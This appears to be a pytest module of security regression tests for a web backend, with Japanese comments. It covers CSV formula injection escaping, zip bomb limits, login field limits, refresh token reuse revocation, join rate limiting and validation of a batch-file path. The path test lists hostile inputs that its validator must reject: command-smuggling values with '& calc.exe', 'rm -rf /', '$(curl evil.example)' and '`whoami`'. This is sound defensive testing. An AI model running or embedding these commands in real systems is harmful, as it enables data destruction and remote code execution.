"""Attack #39+ ハードニングテスト群。

このテストモジュールは以下の脆弱性クラスに対するリグレッションを防止する:

- V1: CSV/Formula injection (CWE-1236)         /api/v1/expert/export
- V2: 解凍爆弾 / zip bomb (CWE-409)             import_package サービス
- V3: WebSocket 過大メッセージ (CWE-770)        ws/live, ws/camera, yolo_realtime
- V4: LoginRequest extra=forbid + 長さ制限      /api/auth/login
- V5: refresh token 並行 rotate race (CWE-367) jwt_utils.rotate_refresh_token
- V6: session join brute force (CWE-307)       /api/sessions/{code}/join
- V7: /api/auth/* Cache-Control no-store        SecurityHeadersMiddleware
- V8: cluster ray_restart_bat 値検証            cluster._SAFE_BAT_RE 相当
"""
from __future__ import annotations

import io
import json
import zipfile

import pytest


# ─── V1: CSV/Formula injection helper ───────────────────────────────────────


class TestCsvInjection:
    def test_csv_safe_prepends_quote_for_dangerous_prefixes(self):
        from backend.routers.expert import _csv_safe

        for danger in ("=cmd", "+1+1", "-2+3", "@SUM(A1)", "\tabc", "\rxyz"):
            assert _csv_safe(danger).startswith("'"), f"failed: {danger!r}"

    def test_csv_safe_passthrough_for_safe_strings(self):
        from backend.routers.expert import _csv_safe

        for safe in ("hello", "1+1", "abc=def", "ok"):
            # 1+1 は内側に + があるが先頭は数字なので無害
            assert _csv_safe(safe) == safe

    def test_csv_safe_passthrough_for_non_strings(self):
        from backend.routers.expert import _csv_safe

        assert _csv_safe(42) == 42
        assert _csv_safe(None) is None
        assert _csv_safe(3.14) == 3.14
        assert _csv_safe("") == ""


# ─── V2: zip bomb ────────────────────────────────────────────────────────────


def _build_pkg(member_files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in member_files.items():
            zf.writestr(name, content)
    return buf.getvalue()


class TestZipBomb:
    def test_member_count_cap(self, db_session):
        from backend.services import import_package as ip

        # 5001 個の小さなファイル → MEMBER_COUNT 上限
        members = {f"f{i}.json": b"[]" for i in range(ip._MAX_MEMBER_COUNT + 1)}
        raw = _build_pkg(members)
        summary = ip.import_package(db_session, raw, dry_run=True)
        assert any("メンバー数" in e for e in summary.errors)

    def test_total_uncompressed_cap(self, db_session, monkeypatch):
        from backend.services import import_package as ip

        # 上限を小さくしてからテスト
        monkeypatch.setattr(ip, "_MAX_TOTAL_UNCOMPRESSED", 1024)
        monkeypatch.setattr(ip, "_MAX_PER_MEMBER", 4096)

        # 各 600 バイト × 3 = 1800 バイト > 1024 で総和上限を超える
        members = {f"f{i}.json": b"x" * 600 for i in range(3)}
        raw = _build_pkg(members)
        summary = ip.import_package(db_session, raw, dry_run=True)
        assert any("解凍後合計" in e for e in summary.errors)

    def test_per_member_cap(self, db_session, monkeypatch):
        from backend.services import import_package as ip

        monkeypatch.setattr(ip, "_MAX_PER_MEMBER", 1024)
        members = {"big.json": b"x" * 4096}
        raw = _build_pkg(members)
        summary = ip.import_package(db_session, raw, dry_run=True)
        assert any("メンバー" in e and "サイズ" in e for e in summary.errors)


# ─── V4: LoginRequest hardening ─────────────────────────────────────────────


class TestLoginRequestHardening:
    def test_extra_field_rejected(self):
        from backend.routers.auth import LoginRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            LoginRequest(grant_type="credential", identifier="abc", password="x", extra_unknown_field="y")

    def test_oversized_identifier_rejected(self):
        from backend.routers.auth import LoginRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            LoginRequest(grant_type="credential", identifier="A" * 65, password="ok")

    def test_oversized_password_rejected(self):
        from backend.routers.auth import LoginRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            LoginRequest(grant_type="credential", identifier="abc", password="x" * 257)

    def test_normal_payload_accepted(self):
        from backend.routers.auth import LoginRequest

        m = LoginRequest(grant_type="credential", identifier="user01", password="LegitPass1!aa")
        assert m.identifier == "user01"


# ─── V5: refresh token rotation race ────────────────────────────────────────


class TestRefreshRotationRace:
    def _seed_user_and_token(self, test_engine):
        from backend.utils.jwt_utils import create_refresh_token, persist_refresh_token
        from backend.db.models import User
        from sqlalchemy.orm import sessionmaker

        Session = sessionmaker(bind=test_engine)
        with Session() as s:
            user = User(username="rot_race_user", role="analyst")
            s.add(user)
            s.commit()
            s.refresh(user)
            uid = user.id
        raw, jti, exp = create_refresh_token(uid)
        persist_refresh_token(uid, raw, jti, exp)
        return uid, raw

    def test_double_rotate_reuses_chain_revoke(self, test_engine):
        """同じ refresh を 2 回 rotate しようとすると 2 回目は reuse 検知で None になる。"""
        from backend.utils.jwt_utils import rotate_refresh_token
        from backend.db.models import RefreshToken, User
        from sqlalchemy.orm import sessionmaker

        Session = sessionmaker(bind=test_engine)
        with Session() as s:
            s.query(RefreshToken).delete()
            s.query(User).filter(User.username.like("rot_race_user%")).delete()
            s.commit()

        uid, raw = self._seed_user_and_token(test_engine)
        first = rotate_refresh_token(raw)
        assert first is not None

        # 2 回目は revoked 行が当たるため None になる
        second = rotate_refresh_token(raw)
        assert second is None

        # chain ごと revoke されているはず: user の active token は new_token のみ → 0 になる
        with Session() as s:
            active = s.query(RefreshToken).filter(
                RefreshToken.user_id == uid,
                RefreshToken.revoked_at.is_(None),
            ).count()
        assert active == 0


# ─── V6: session join brute force rate limit ────────────────────────────────


class TestSessionJoinRateLimit:
    def test_rate_limit_kicks_in(self):
        from backend.routers import sessions as sess

        sess._JOIN_FAILURES.clear()
        for _ in range(sess._JOIN_RATE_LIMIT):
            sess._record_join_failure("CODEXX")

        from fastapi import HTTPException
        with pytest.raises(HTTPException) as ei:
            sess._check_join_rate_limit("CODEXX")
        assert ei.value.status_code == 429

    def test_independent_codes_dont_share_quota(self):
        from backend.routers import sessions as sess

        sess._JOIN_FAILURES.clear()
        for _ in range(sess._JOIN_RATE_LIMIT):
            sess._record_join_failure("AAAAAA")
        # 別 code は影響を受けない
        sess._check_join_rate_limit("BBBBBB")  # 例外が出なければ OK


# ─── V8: cluster ray_restart_bat 値検証 ────────────────────────────────────


class TestRayRestartBatValidation:
    def _safe_match(self, bat: str) -> bool:
        # cluster.py 内部の安全パターンと等価なローカル定義
        import re
        SAFE_BAT_RE = re.compile(r"^[A-Za-z]:[\\/][A-Za-z0-9_\-\\/. ]+\.(?:bat|cmd)$")
        if not isinstance(bat, str) or not SAFE_BAT_RE.match(bat):
            return False
        return not any(c in bat for c in ('"', "'", "&", "|", ";", "`", "$", "\n", "\r", "%"))

    def test_safe_paths_accepted(self):
        assert self._safe_match(r"C:\\workers\\restart_ray.bat")
        assert self._safe_match(r"D:/tools/ray-restart.cmd")

    def test_unsafe_paths_rejected(self):
        for bad in [
            r'C:\\restart.bat" & calc.exe & "',
            r"C:\\restart.bat; rm -rf /",
            r"$(curl evil.example).bat",
            r"`whoami`.bat",
            r"/etc/passwd",
            r"C:\\restart.exe",
        ]:
            assert not self._safe_match(bad), f"should reject: {bad!r}"
